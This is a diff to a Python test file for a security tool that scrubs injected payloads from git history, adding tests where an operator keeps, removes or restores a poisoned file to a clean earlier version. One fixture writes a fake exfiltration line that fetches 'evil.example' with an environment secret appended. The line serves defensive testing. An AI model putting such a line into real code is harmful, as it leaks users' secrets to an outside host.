@@ -19,7 +19,7 @@ from stayawake.bots.security.models import CONFIRMED, HEURISTIC, Finding, ScanRe
 from stayawake.bots.security.signatures import load_signatures
 from stayawake.bots.security.pr import amend as amendmod
 from stayawake.bots.security.pr.amend import amend_outcome, amend_repo
-from stayawake.bots.security.pr.resolve import Decision
+from stayawake.bots.security.pr.resolve import KEEP, REMOVE, RESTORE, Resolution
 from stayawake.bots.security.pr.outcome import (BranchResult, Cause, Reason, amended,
                                                       render_amend_line)
 from stayawake.bots.security.targets import ScanOptions
@@ -1628,7 +1628,7 @@ class TestAmendActsOnContentPayload(_AmendFixture):
         """The branch that isolates on an un-modellable commit is delivered instead when the operator
         removes that commit's injected files."""
         _iso, findings = self._deliverable_beside_an_uncharacterizable_commit()
-        outcome = self._run_with_findings(findings, resolver=lambda item: Decision(remove=True))
+        outcome = self._run_with_findings(findings, resolver=lambda item: Resolution(REMOVE))
         by_name = {b.name: b for b in outcome.branches}
         self.assertTrue(by_name["iso"].force_updated,
                         "the operator removed the injected files and iso was delivered")
@@ -1642,7 +1642,7 @@ class TestAmendActsOnContentPayload(_AmendFixture):
 
         def resolver(item):
             asked.append(item.path)
-            return Decision(remove=(item.path == "suspect.bin"))
+            return Resolution(REMOVE if item.path == "suspect.bin" else KEEP)
 
         outcome = self._run_with_findings(findings, resolver=resolver)
         self.assertTrue(outcome.completed, self._causes(outcome))
@@ -1653,7 +1653,7 @@ class TestAmendActsOnContentPayload(_AmendFixture):
 
     def test_an_uncertain_file_the_operator_keeps_is_left_alone(self):
         findings = self._confirmed_loader_and_suspect()
-        outcome = self._run_with_findings(findings, resolver=lambda item: Decision(remove=False))
+        outcome = self._run_with_findings(findings, resolver=lambda item: Resolution(KEEP))
         self.assertTrue(outcome.completed, self._causes(outcome))
         self.assertTrue(self._present(f"{self.base}:suspect.bin"),
                         "a file the operator kept stays in history")
@@ -1691,7 +1691,7 @@ class TestAmendActsOnContentPayload(_AmendFixture):
 
         def resolver(item):
             seen[item.path] = item
-            return Decision(remove=False)
+            return Resolution(KEEP)
 
         outcome = self._run_with_findings(findings, resolver=resolver)
         self.assertTrue(outcome.completed, self._causes(outcome))
@@ -1706,7 +1706,7 @@ class TestAmendActsOnContentPayload(_AmendFixture):
 
         def resolver(item):
             seen[item.path] = item
-            return Decision(remove=False)
+            return Resolution(KEEP)
 
         outcome = self._run_with_findings(self._confirmed_loader_and_suspect(), resolver=resolver)
         self.assertTrue(outcome.completed, self._causes(outcome))
@@ -1733,7 +1733,7 @@ class TestAmendActsOnContentPayload(_AmendFixture):
         """A confirmed payload with no automatic remediation (would be needs-manual-recovery) is
         removed when the operator says so, instead of the run refusing."""
         outcome = self._run_with_findings(self._unhandled_confirmed_file(),
-                                          resolver=lambda item: Decision(remove=True))
+                                          resolver=lambda item: Resolution(REMOVE))
         self.assertTrue(outcome.completed, self._causes(outcome))
         self.assertFalse(self._present(f"{self.base}:steal.js"), "the operator-removed file is gone")
 
@@ -1742,6 +1742,55 @@ class TestAmendActsOnContentPayload(_AmendFixture):
         self.assertFalse(outcome.completed)
         self.assertIn(Cause.PAYLOAD_NEEDS_MANUAL_RECOVERY, self._causes(outcome))
         self.assertTrue(self._present(f"{self.base}:steal.js"))
+
+    def _confirmed_file_with_a_clean_ancestor(self):
+        """A file added clean, then poisoned by a later commit with a confirmed payload saw cannot
+        auto-clean. The clean version is on the path's first-parent history."""
+        self.write(self.d, "util.js", "export const add = (a, b) => a + b;\n")
+        self.commit(self.d, "add a clean util")
+        self.write(self.d, "util.js", "fetch('https://evil.example/'+process.env.SECRET)\n")
+        self.commit(self.d, "poison util.js")
+        return [Finding("exfil-secret", "exfil", Severity.CRITICAL, "util.js",
+                        "exfiltrates an env secret", confidence=CONFIRMED)]
+
+    def test_the_operator_can_restore_a_clean_ancestor_of_a_confirmed_file(self):
+        """A confirmed payload with a clean earlier version is put back in place, not removed, when
+        the operator restores it — the file stays and the delivered tip holds the clean bytes."""
+        findings = self._confirmed_file_with_a_clean_ancestor()
+        seen = []
+
+        def resolver(item):
+            seen.append(item)
+            return Resolution(RESTORE, item.restore_candidate)
+
+        outcome = self._run_with_findings(findings, resolver=resolver)
+        self.assertTrue(outcome.completed, self._causes(outcome))
+        self.assertTrue(self._present(f"{self.base}:util.js"), "the restored file stays in history")
+        self.assertEqual(self.git(self.d, "cat-file", "blob", f"{self.base}:util.js"),
+                         "export const add = (a, b) => a + b;\n")
+        self.assertIn(Cause.FILE_RESTORED_TO_A_CLEAN_VERSION, self._causes(outcome))
+        self.assertIsNotNone(seen[0].restore_candidate, "the item offered a clean version to restore")
+
+    def test_a_confirmed_file_with_no_clean_ancestor_offers_no_restore(self):
+        """A file that was born poisoned has no clean version to put back, so no restore is offered —
+        the operator's only lever there is remove-whole."""
+        seen = []
+
+        def resolver(item):
+            seen.append(item)
+            return Resolution(KEEP)
+
+        self._run_with_findings(self._unhandled_confirmed_file(), resolver=resolver)
+        self.assertEqual(seen[0].path, "steal.js")
+        self.assertIsNone(seen[0].restore_candidate)
+
+    def test_restoring_needs_a_resolver_so_a_clean_ancestor_is_not_put_back_on_its_own(self):
+        """Without an operator the confirmed payload is never silently restored — it still needs
+        manual recovery, exactly as before."""
+        outcome = self._run_with_findings(self._confirmed_file_with_a_clean_ancestor(), resolver=None)
+        self.assertFalse(outcome.completed)
+        self.assertIn(Cause.PAYLOAD_NEEDS_MANUAL_RECOVERY, self._causes(outcome))
+        self.assertTrue(self._present(f"{self.base}:util.js"))
 
     def test_the_payload_check_recreates_a_symlink_from_its_blob_not_as_text(self):
         """A write-redirect symlink is a git mode-120000 blob holding the target string. Read back as
